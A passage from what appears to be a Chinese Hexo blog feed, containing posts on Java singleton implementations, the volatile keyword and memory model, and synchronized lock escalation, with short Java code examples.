双重锁懒汉模式"></a>2. 双重锁懒汉模式</h4><p>与饿汉模式相比，懒汉模式是在使用的时候才创建实例，比饿汉模式减少了资源浪费，但复杂度上升，代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">public class SettingManager &#123;</span><br><span class="line">    private static volatile SettingManager INSTANCE; &#x2F;&#x2F;JIT</span><br><span class="line"></span><br><span class="line">    private SettingManager() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static SettingManager getInstance() &#123;</span><br><span class="line">        if (INSTANCE &#x3D;&#x3D; null) &#123;</span><br><span class="line">            &#x2F;&#x2F;双重检查， double check</span><br><span class="line">            synchronized (SettingManager.class) &#123;</span><br><span class="line">                if(INSTANCE &#x3D;&#x3D; null) &#123;</span><br><span class="line">                    INSTANCE &#x3D; new SettingManager();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return INSTANCE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>优点： 避免资源浪费，使用时才创建<br>缺点：需要处理多线程情况，通过synchronized解决了线程安全问题，但也会使效率下降，需要双重检查(double check lock)。使用volatile防止指令重排序导致没有初始化的问题。</p><h4 id="3-静态内部类模式"><a href="#3-静态内部类模式" class="headerlink" title="3. 静态内部类模式"></a>3. 静态内部类模式</h4><p>静态内部类把实例的初始化放在静态内部类里面，代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public class SettingManager &#123;</span><br><span class="line"></span><br><span class="line">    private SettingManager() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static class SettingManagerHolder &#123;</span><br><span class="line">        private final static SettingManager INSTANCE &#x3D; new SettingManager();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static SettingManager getInstance() &#123;</span><br><span class="line">        return SettingManagerHolder.INSTANCE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>优点：加载外部类时不会加载内部类，这样可以实现懒加载，只有调用getInstance()方法时才会加载内部类。JVM保证单例，不存在线程安全问题。复杂度比懒汉模式低，外部无法控制实例初始化的过程，无法传递参数进去。<br>如果单例类需要在脱离单例对象的情况下使用，可以用静态内部类模式。</p><p><code>类只能同时被1个线程初始化，且在同一个加载器中，同一个类不会第二次初始化。所以饿汉模式和静态内部类模式都没有线程安全问题</code></p><h4 id="4-枚举单例模式"><a href="#4-枚举单例模式" class="headerlink" title="4. 枚举单例模式"></a>4. 枚举单例模式</h4><p>在java中，enum可以像一个正常的class一样定义属性和方法，枚举单例模式是使用枚举类型作为一个单例。代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public enum SettingManager &#123;</span><br><span class="line"></span><br><span class="line">    INSTANCE;</span><br><span class="line"></span><br><span class="line">    private String field1;</span><br><span class="line">    private Integer field2;</span><br><span class="line"></span><br><span class="line">    public void method1()&#123;</span><br><span class="line">        &#x2F;&#x2F; ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void method2()&#123;</span><br><span class="line">        &#x2F;&#x2F; ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>优点：不仅可以解决线程同步，还可以防止反序列化。枚举类没有构造方法， 所以不会被反射调用创建新的object。<br>缺点：可以实现接口，但不能继承。如果将枚举类型作为普通类使用，会失去其作为枚举类型的意义。</p><p>如果单例模式可能被破坏，可以使用枚举单例模式。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>上面4种方式中，比较推荐饿汉模式，它虽然可能有资源浪费，但这个可能性真的很小，最重要的是它实现起来非常简单。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Java  设计模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>volatile的作用</title>
      <link href="/2021/01/24/volatile%E7%9A%84%E4%BD%9C%E7%94%A8/"/>
      <url>/2021/01/24/volatile%E7%9A%84%E4%BD%9C%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h1><p>计算机最大的存储空间就是磁盘（硬盘），但是访问的速度也是最慢的，价格最便宜；再就是内存，容量更小，造价更高，但是速度也更快。不过跟cpu的计算速度比起来，那就太慢了。可以想像，如果cpu每次计算都要从内存读取数据，那大部分的时间估计都浪费在这上面了。所以就引入了缓存的概：<br><img src="https://upload-images.jianshu.io/upload_images/15531792-e0792fe47faa1fc7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>缓存的结构大概是这样的，从1级到3级速度越来越慢，最后通过总线与内存连接。如果时多核多cpu，那么结构大概是这样的：<br><img src="https://upload-images.jianshu.io/upload_images/15531792-7d7a9bb6ed02db32.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h4 id="多线程造成的缓存不一致"><a href="#多线程造成的缓存不一致" class="headerlink" title="多线程造成的缓存不一致"></a>多线程造成的缓存不一致</h4><p>由于现在大部分的机器都有多个cpu，这就导致如果是运行多线程的任务，就可能运行在不同的cpu上。试想一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int a &#x3D; 0;</span><br><span class="line">int b &#x3D; a;</span><br><span class="line">b +&#x3D; 1;</span><br></pre></td></tr></table></figure><p>如果开启两个线程执行，我们想要的结果是3，但是最后的结果只是2。这是因为在做加法运算的时候，cpu会先把a的值读入cpu的缓存，然后更新缓存，在更新内存。很有可能两个线程分散在两个cpu，每个都是对自己缓存内的数据进行读写，这样就造成了结果不一致的现象。</p><h1 id="volatile-的作用"><a href="#volatile-的作用" class="headerlink" title="volatile 的作用"></a>volatile 的作用</h1><p>从多核CPU的缓存中我们知道volatile的作用就是当一个线程更新某个volatile声明的变量时，会通知其他的cpu使缓存失效，从而其他cpu想要做更新操作时，需要从内存重新读取数据。具体的通知方式，一种是通过<strong>某种协议</strong>，比如MESI；再就是<strong>对总线加锁</strong>，控制变量的读取。</p><p>在多线程中，volatile和synchronized都起到非常重要的作用，synchronized是通过加锁来实现线程的安全性。而volatile的主要作用是在多处理器开发中保证共享变量对于多线程的可见性。<br>可见性的意思是，当一个线程修改一个共享变量时，另外一个线程能读取到修改以后的值。接下来通过一个简单的案例来演示可见性问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">public class VolatileDemo &#123;</span><br><span class="line">    private &#x2F;*volatile*&#x2F; static boolean stop&#x3D;false; &#x2F;&#x2F;添加volatile修饰和不添加volatile修饰的演示效果</span><br><span class="line">    public static void main(String[] args) throws InterruptedException &#123;</span><br><span class="line">        Thread thread&#x3D;new Thread(()-&gt;&#123;</span><br><span class="line">            int i&#x3D;0;</span><br><span class="line">            while(!stop)&#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        thread.start();</span><br><span class="line">        System.out.println(&quot;begin start thread&quot;);</span><br><span class="line">        Thread.sleep(1000);</span><br><span class="line">        stop&#x3D;true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li>定义一个共享变量 stop</li><li>在main线程中创建一个子线程 thread，子线程读取到 stop的值做循环结束的条件</li><li>main线程中修改stop的值为 true</li><li>当 stop没有增加volatile修饰时，子线程对于主线程的 stop=true的修改是不可见的，这样将导致子线程出现死循环</li><li>当 stop增加了volatile修饰时，子线程可以获取到主线程对于 stop=true的值，子线程while循环条件不满足退出循环</li></ol><p>增加volatile关键字以后，main线程对于共享变量 stop值的更新，对于子线程 thread可见，这就是volatile的作用</p><h1 id="什么是可见性"><a href="#什么是可见性" class="headerlink" title="什么是可见性"></a>什么是可见性</h1><p>在并发编程中，线程安全问题的本质其实就是 原子性、有序性、可见性；接下来主要围绕这三个问题进行展开分析其本质，彻底了解可见性的特性</p><ul><li><strong>原子性</strong> 和数据库事务中的原子性一样，满足原子性特性的操作是不可中断的，要么全部执行成功要么全部执行失败</li><li><strong>有序性</strong> 编译器和处理器为了优化程序性能而对指令序列进行重排序，也就是你编写的代码顺序和最终执行的指令顺序是不一致的，重排序可能会导致多线程程序出现内存可见性问题</li><li><strong>可见性</strong> 多个线程访问同一个共享变量时，其中一个线程对这个共享变量值的修改，其他线程能够立刻获得修改以后的值</li></ul><h1 id="1-原子性"><a href="#1-原子性" class="headerlink" title="1. 原子性"></a>1. 原子性</h1><p>即一个操作或者多个操作，要么全部执行并且执行的过程不会被任何因素打断，要么就都不执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">i &#x3D; 0;       &#x2F;&#x2F;1</span><br><span class="line">j &#x3D; i ;      &#x2F;&#x2F;2</span><br><span class="line">i++;         &#x2F;&#x2F;3</span><br><span class="line">i &#x3D; j + 1;   &#x2F;&#x2F;4</span><br></pre></td></tr></table></figure><p>上面四个操作，有哪个几个是原子操作，那几个不是？如果不是很理解，可能会认为都是原子性操作，其实只有1才是原子操作，其余均不是。</p><ol><li>在Java中，对基本数据类型的变量和赋值操作都是原子性操作； </li><li>中包含了两个操作：读取i，将i值赋值给j </li><li>中包含了三个操作：读取i值、i + 1 、将+1结果赋值给i； </li><li>中同三一样</li></ol><p>在单线程环境下我们可以认为整个步骤都是原子性操作，但是在多线程环境下则不同，Java只保证了基本数据类型的变量和赋值操作才是原子性的（注：在32位的JDK环境下，对64位数据的读取不是原子性操作，如long、double）。</p><p>要想在多线程环境下保证原子性，则可以通过锁、synchronized来确保。volatile是无法保证复合操作的原子性。</p><h1 id="2-可见性"><a href="#2-可见性" class="headerlink" title="2. 可见性"></a>2. 可见性</h1><p>可见性是指当多个线程访问同一个变量时，一个线程修改了这个变量的值，其他线程能够立即看得到修改的值。<br>举个简单的例子，看下面这段代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;线程1执行的代码</span><br><span class="line">int i &#x3D; 0;</span><br><span class="line">i &#x3D; 10;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;线程2执行的代码</span><br><span class="line">j &#x3D; i;</span><br></pre></td></tr></table></figure><p>假若执行线程1的是CPU1，执行线程2的是CPU2。由上面的分析可知，当线程1执行 i = 10这句时，会先把i的初始值加载到CPU1的高速缓存中，然后赋值为10，那么在CPU1的高速缓存当中i的值变为10了，却没有立即写入到主存当中。此时线程2执行 j = i，它会先去主存读取i的值并加载到CPU2的缓存当中，注意此时内存当中i的值还是0，那么就会使得j的值为0，而不是10。这就是可见性问题，线程1对变量i修改了之后，线程2没有立即看到线程1修改的值。</p><p>在上面已经分析了，在多线程环境下，一个线程对共享变量的操作对其他线程是不可见的。</p><p>对于可见性，Java提供了volatile关键字来保证可见性。当一个共享变量被volatile修饰时，它会保证修改的值会立即被更新到主存，当有其他线程需要读取时，它会去内存中读取新值。而普通的共享变量不能保证可见性，因为普通共享变量被修改之后，什么时候被写入主存是不确定的，当其他线程去读取时，此时内存中可能还是原来的旧值，因此无法保证可见性。</p><p>另外，通过synchronized和Lock也能够保证可见性，synchronized和Lock能保证同一时刻只有一个线程获取锁然后执行同步代码，并且在释放锁之前会将对变量的修改刷新到主存当中。因此可以保证可见性。</p><h1 id="3-有序性"><a href="#3-有序性" class="headerlink" title="3. 有序性"></a>3. 有序性</h1><p>即程序执行的顺序按照代码的先后顺序执行。<br>举个简单的例子，看下面这段代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int i &#x3D; 0;              </span><br><span class="line">boolean flag &#x3D; false;</span><br><span class="line">i &#x3D; 1;                &#x2F;&#x2F;语句1  </span><br><span class="line">flag &#x3D; true;          &#x2F;&#x2F;语句2</span><br></pre></td></tr></table></figure><p>上面代码定义了一个int型变量，定义了一个boolean类型变量，然后分别对两个变量进行赋值操作。从代码顺序上看，语句1是在语句2前面的，那么JVM在真正执行这段代码的时候会保证语句1一定会在语句2前面执行吗？不一定，为什么呢？这里可能会发生指令重排序（Instruction Reorder）。</p><p>下面解释一下什么是指令重排序，一般来说，处理器为了提高程序运行效率，可能会对输入代码进行优化，它不保证程序中各个语句的执行先后顺序同代码中的顺序一致，但是它会保证程序最终执行结果和代码顺序执行的结果是一致的。</p><p>比如上面的代码中，语句1和语句2谁先执行对最终的程序结果并没有影响，那么就有可能在执行过程中，语句2先执行而语句1后执行。但是要注意，虽然处理器会对指令进行重排序，但是它会保证程序最终结果会和代码顺序执行结果相同，那么它靠什么保证的呢？再看下面一个例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int a &#x3D; 10;    &#x2F;&#x2F;语句1</span><br><span class="line">int r &#x3D; 2;    &#x2F;&#x2F;语句2</span><br><span class="line">a &#x3D; a + 3;    &#x2F;&#x2F;语句3</span><br><span class="line">r &#x3D; a*a;     &#x2F;&#x2F;语句4</span><br></pre></td></tr></table></figure><p>这段代码有4个语句，那么可能的一个执行顺序是：<br>语句2 -&gt; 语句1 -&gt; 语句3 -&gt; 语句4<br>那么可不可能是这个执行顺序：<br>语句2 -&gt; 语句1 -&gt; 语句4 -&gt; 语句3。<br>不可能，因为处理器在进行重排序时是会考虑指令之间的数据依赖性，如果一个指令Instruction 2必须用到Instruction 1的结果，那么处理器会保证Instruction 1会在Instruction 2之前执行。虽然重排序不会影响单个线程内程序执行的结果，但是多线程呢？下面看一个例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;线程1:</span><br><span class="line">context &#x3D; loadContext();   &#x2F;&#x2F;语句1</span><br><span class="line">inited &#x3D; true;             &#x2F;&#x2F;语句2</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;线程2:</span><br><span class="line">while(!inited )&#123;</span><br><span class="line">  sleep()</span><br><span class="line">&#125;</span><br><span class="line">doSomethingwithconfig(context);</span><br></pre></td></tr></table></figure><p>上面代码中，由于语句1和语句2没有数据依赖性，因此可能会被重排序。假如发生了重排序，在线程1执行过程中先执行语句2，而此时线程2会以为初始化工作已经完成，那么就会跳出while循环，去执行doSomethingwithconfig(context)方法，而此时context并没有被初始化，就会导致程序出错。</p><p>从上面可以看出，指令重排序不会影响单个线程的执行，但是会影响到线程并发执行的正确性。也就是说，要想并发程序正确地执行，必须要保证原子性、可见性以及有序性。只要有一个没有被保证，就有可能会导致程序运行不正确。</p><p>在Java内存模型中，允许编译器和处理器对指令进行重排序，但是重排序过程不会影响到单线程程序的执行，却会影响到多线程并发执行的正确性。</p><p>在Java里面，可以通过volatile关键字来保证一定的“有序性”。另外可以通过synchronized和Lock来保证有序性，很显然，synchronized和Lock保证每个时刻是有一个线程执行同步代码，相当于是让线程顺序执行同步代码，自然就保证了有序性。另外，Java内存模型具备一些先天的“有序性”，即不需要通过任何手段就能够得到保证的有序性，这个通常也称为 happens-before 原则。如果两个操作的执行次序无法从happens-before原则推导出来，那么它们就不能保证它们的有序性，虚拟机可以随意地对它们进行重排序。</p><h4 id="如何保证有序性"><a href="#如何保证有序性" class="headerlink" title="如何保证有序性"></a>如何保证有序性</h4><ul><li>synchronized 和lock</li><li>happens-before原则，即不需要通过任何手段就能够得到保证的有序性，这个通常也称为 happens-before 原则。如果两个操作的执行次序无法从happens-before原则推导出来，那么它们就不能保证它们的有序性，虚拟机可以随意地对它们进行重排序。</li><li>volatile 关键字， JVM 内存屏障： 屏障两边的指令不可以重排！保障有序！</li><li>as if serial : 不管怎么重排序，单线程程序的执行结果不能被改变。编译器、runtime和处理器都必须遵守as-if-serial语义。所以编译器和处理器不会对存在数据依赖关系的操作做重排序，因为这种重排序会改变执行结果。但是，如果操作之间不存在数据依赖关系，这些操作就可能被编译器和处理器重排序</li></ul><h1 id="一些细节"><a href="#一些细节" class="headerlink" title="一些细节"></a>一些细节</h1><h4 id="MESI"><a href="#MESI" class="headerlink" title="MESI"></a>MESI</h4><p>所谓缓存一致性，就是多个CPU核心中缓存的同一共享数据的数据一致性，而(MESI)使用比较广泛的缓存一致性协议。MESI协议实际上是表示缓存的四种状态</p><ul><li>M(Modify) 表示共享数据只缓存在当前CPU缓存中，并且是被修改状态，也就是缓存的数据和主内存中的数据不一致</li><li>E(Exclusive) 表示缓存的独占状态，数据只缓存在当前CPU缓存中，并且没有被修改</li><li>S(Shared) 表示数据可能被多个CPU缓存，并且各个缓存中的数据和主内存数据一致</li><li>I(Invalid) 表示缓存已经失效`</li></ul><p>每个CPU核心不仅仅知道自己的读写操作，也会监听其他Cache的读写操作<br>CPU的读取会遵循几个原则<br><img src="https://upload-images.jianshu.io/upload_images/15531792-d306b060db608814.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><ol><li>如果缓存的状态是I，那么就从内存中读取，否则直接从缓存读取</li><li>如果缓存处于M或者E的CPU 嗅探到其他CPU有读的操作，就把自己的缓存写入到内存，并把自己的状态设置为S</li><li>只有缓存状态是M或E的时候，CPU才可以修改缓存中的数据，修改后，缓存状态变为</li></ol><h4 id="如何实现一致性"><a href="#如何实现一致性" class="headerlink" title="如何实现一致性"></a>如何实现一致性</h4><ol><li>MESI如果能解决，就使用MESI</li><li>如果不能，就锁总线</li></ol><h4 id="singleton-DCL-double-check-lock"><a href="#singleton-DCL-double-check-lock" class="headerlink" title="singleton DCL (double check lock)"></a>singleton DCL (double check lock)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public class MySingleon&#123;</span><br><span class="line">        private static volatile MySingleon instance; &#x2F;&#x2F; 需要加上 volatile</span><br><span class="line">        public static MySingleon getInstance()&#123;</span><br><span class="line">    if(null &#x3D;&#x3D; instance)&#123;</span><br><span class="line">    synchronized (MySingleon.class)&#123;</span><br><span class="line">    if(null &#x3D;&#x3D; instance)&#123;</span><br><span class="line">    instance &#x3D; new MySingleon();</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">     &#125;</span><br><span class="line">    return instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于上述创建object的过程会经历三个阶段</p><ol><li>new 一块内存，变量为默认值 0，半初始化</li><li>初始化为类的初始值</li><li>将对象和指针 关联起来</li></ol><p>3和2 无法推导happens before, 因此可能会被指令重排序， 指令重排序之后， 3 可能在2 前面， 其他线程拿到半初始化的指针去用。 导致变量的值和类初始值不一样。<br>因此，对于double check 与synchronized创建的singleton，我们需要对成员变量加上 volatile。</p><h4 id="JRS-内存屏障"><a href="#JRS-内存屏障" class="headerlink" title="JRS 内存屏障"></a>JRS 内存屏障</h4><p> 在两条指令之间加屏障就可以阻止重排序。 java 虚拟机的几种屏障规范实现（底层硬件没有）：</p><ul><li>LoadLoad, 两条load之间的屏障</li><li>StoreStore， 两条store之间的屏障</li><li>LoadStore， load和store之间的屏障</li><li>StoreLoad， store和load之间的屏障</li></ul><p><strong>volatile 阻止指令冲排序过程：</strong></p><ol><li><p>write:<br>StoreStoreBarrier    所有写操作完了才写<br>volatile write<br>StoreLoadBarrier   我写完了后面才能读</p></li><li><p>read<br>LoadLoadBarrier     我读完了后面才能读<br>volatile read<br>LoadStoreBarrier   我读完了后面才能写</p></li></ol><h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ul><li><a href="https://www.cnblogs.com/xing901022/p/7840684.html">Volatile的作用</a></li><li><a href="https://segmentfault.com/a/1190000017255405">(七)Volatile的作用及原理</a></li><li><a href="https://www.cnblogs.com/yeyang/p/13576636.html">并发编程三大特性——原子性、可见性、有序性</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Java, 多线程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Synchronized 锁升级过程</title>
      <link href="/2021/01/16/Synchronized-%E9%94%81%E5%8D%87%E7%BA%A7%E8%BF%87%E7%A8%8B/"/>
      <url>/2021/01/16/Synchronized-%E9%94%81%E5%8D%87%E7%BA%A7%E8%BF%87%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="对象结构"><a href="#对象结构" class="headerlink" title="对象结构"></a>对象结构</h1><p>Java 对象存储在堆中，那么一个java对象在内存中的结构哪些信息呢？包含对象头，对象体和对齐字节，以下是一个java对象在32位操作系统中的结构<br><img src="https://upload-images.jianshu.io/upload_images/15531792-dd0e52bf7ffa79df.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><strong>对象头</strong></p><ul><li>MarkWord， 记录锁信息（synchronized，hashcode， 最原始的hashcode, 自己写的不算， gc信息, 4bit， 分代年龄，就是gc的信息, 最大15。</li><li>对象指针，指向对象的指针，其指向的位置是对象对应的Class对象（其对应的元数据对象）的内存地址。如果是数组就是长度。</li></ul><p><strong>对象体</strong></p><ul><li>对象数据， 实际的对象数据，其大小由各个成员变量的大小决定，比如：byte和boolean是1个字节，short和char是2个字节，int和float是4个字节，long和double是8个字节，reference是4个字节。</li></ul><p><strong>对齐字节</strong></p><ul><li>如果占用内存不能被8整除，内存加到可以被8整除为止</li></ul><h1 id="Synchronized-锁优化"><a href="#Synchronized-锁优化" class="headerlink" title="Synchronized 锁优化"></a>Synchronized 锁优化</h1><p>锁状态有四种，其中偏向锁和轻量级锁都是在用户态，而重量级锁需要向操作系统申请，在内核态。</p><ul><li>无锁</li><li>偏向锁</li><li>轻量级锁</li><li>重量级锁</li></ul><h4 id="偏向锁"><a href="#偏向锁" class="headerlink" title="偏向锁"></a>偏向锁</h4><p><strong>为什么要引入偏向锁</strong></p><ul><li>因为经过HotSpot的作者大量的研究发现，大多数(90%)时候是不存在锁竞争的，常常是一个线程多次获得同一个锁，因此如果每次都要竞争锁会增大很多没有必要付出的代价，为了降低获取锁的代价，才引入的偏向锁。</li></ul><p><strong>如何上偏向锁</strong></p><ul><li>上偏向锁是在对象的markword上贴上线程id，一般偏向第一个线程。</li></ul><p><strong>偏向锁升级</strong></p><ul><li>当线程1访问代码块并获取锁对象时，会在java对象头和栈帧中记录偏向的锁的threadID，因为偏向锁不会主动释放锁，因此以后线程1再次获取锁的时候，需要比较当前线程的threadID和Java对象头中的threadID是否一致，如果一致（还是线程1获取锁对象），则无需使用CAS来加锁、解锁；如果不一致（其他线程，如线程2要竞争锁对象，而偏向锁不会主动释放因此还是存储的线程1的threadID），那么需要查看Java对象头中记录的线程1是否存活，如果没有存活，那么锁对象被重置为无锁状态，其它线程（线程2）可以竞争将其设置为偏向锁；如果存活，那么立刻查找该线程（线程1）的栈帧信息，如果还是需要继续持有这个锁对象，那么暂停当前线程1，撤销偏向锁，升级为轻量级锁，如果线程1 不再使用该锁对象，那么将锁对象状态设为无锁状态，重新偏向新的线程。</li></ul><p><strong>如何取消偏向锁</strong></p><ul><li>偏向锁是默认开启的，而且开始时间一般是比应用程序启动慢几秒，如果不想有这个延迟，那么可以使用JVM调优： -XX:BiasedLockingStartUpDelay=0；<br>如果不想要偏向锁，那么可以通过-XX:-UseBiasedLocking = false来设置；</li></ul><h4 id="轻量级锁"><a href="#轻量级锁" class="headerlink" title="轻量级锁"></a>轻量级锁</h4><p><strong>为什么要引入轻量级锁</strong></p><ul><li>轻量级锁考虑的是竞争锁对象的线程不多，而且线程持有锁的时间也不长的情景。因为阻塞线程需要CPU从用户态转到内核态，代价较大，如果刚刚阻塞不久这个锁就被释放了，那这个代价就有点得不偿失了，因此这个时候就干脆不阻塞这个线程，让它自旋这等待锁释放。</li></ul><p><strong>上轻量级锁过程</strong></p><ul><li>轻量级锁为CAS自旋锁(自旋锁, compare and swap)，在需要上锁的线程上面进行操作。步骤如下：</li></ul><ol><li>将竞争的变量值拷贝本线程的内存</li><li>在本线程计算结果</li><li>比较竞争变量在1中的值和当前值， 如果一致，说明没有其他进程改写(也可能改写了但是值一样)，将2中计算的值填入变量中。如果1中的值和现在的值不一样，那么回到第一步重新自旋，直到改写变量成功为止。对于其他进程改变了变量的值，只是值一样，如果需要考虑这种情况为竞争过，可以为变量值加一个版本号。</li></ol><p><strong>轻量级锁升级</strong></p><ul><li><p>线程1获取轻量级锁时会先把锁对象的对象头MarkWord复制一份到线程1的栈帧中创建的用于存储锁记录的空间（称为DisplacedMarkWord），然后使用CAS把对象头中的内容替换为线程1存储的锁记录（DisplacedMarkWord）的地址；</p></li><li><p>如果在线程1复制对象头的同时（在线程1CAS之前），线程2也准备获取锁，复制了对象头到线程2的锁记录空间中，但是在线程2CAS的时候，发现线程1已经把对象头换了，线程2的CAS失败，那么线程2就尝试使用自旋锁来等待线程1释放锁。</p></li><li><p>但是如果自旋的时间太长也不行，因为自旋是要消耗CPU的，因此自旋的次数是有限制的，比如10次或者100次，如果自旋次数到了线程1还没有释放锁，或者线程1还在执行，线程2还在自旋等待，这时又有一个线程3过来竞争这个锁对象，那么这个时候轻量级锁就会膨胀为重量级锁。重量级锁把除了拥有锁的线程都阻塞，防止CPU空转。</p></li></ul><p><code>*注意：为了避免无用的自旋，轻量级锁一旦膨胀为重量级锁就不会再降级为轻量级锁了；偏向锁升级为轻量级锁也不能再降级为偏向锁。一句话就是锁可以升级不可以降级，但是偏向锁状态可以被重置为无锁状态。</code></p><h4 id="重量级锁"><a href="#重量级锁" class="headerlink" title="重量级锁"></a>重量级锁</h4><p>重量级锁需要向操作系统申请，程序从用户态-&gt; 内核态 -&gt; 用户态。上重量级锁后，对于没有获得锁的线程，将会根据优先级到锁的队列里进行排队，队列里的线程将会处于睡眠状态，获得锁之后会被操作系统唤醒。对于多个CPU来说，一个CPU可以通过锁住总线来防止其他CPU改写数据。</p><h4 id="synchronized-锁升级过程"><a href="#synchronized-锁升级过程" class="headerlink" title="synchronized 锁升级过程"></a>synchronized 锁升级过程</h4><p>锁升级过程大致如下<br><img src="https://upload-images.jianshu.io/upload_images/15531792-d4cf1af38b718c2d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ul><li><a href="https://www.cnblogs.com/duanxz/p/4967042.html">java对象在内存中的结构（HotSpot虚拟机）</a></li><li><a href="https://blog.csdn.net/tongdanping/article/details/79647337">Java并发——Synchronized关键字和锁升级，详细分析偏向锁和轻量级锁的升级</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React Router 使用</title>
      <link href="/2021/01/07/React-Router-%E4%BD%BF%E7%94%A8/"/>
      <url>/2021/01/07/React-Router-%E4%BD%BF%E7%94%A8/</url>
      
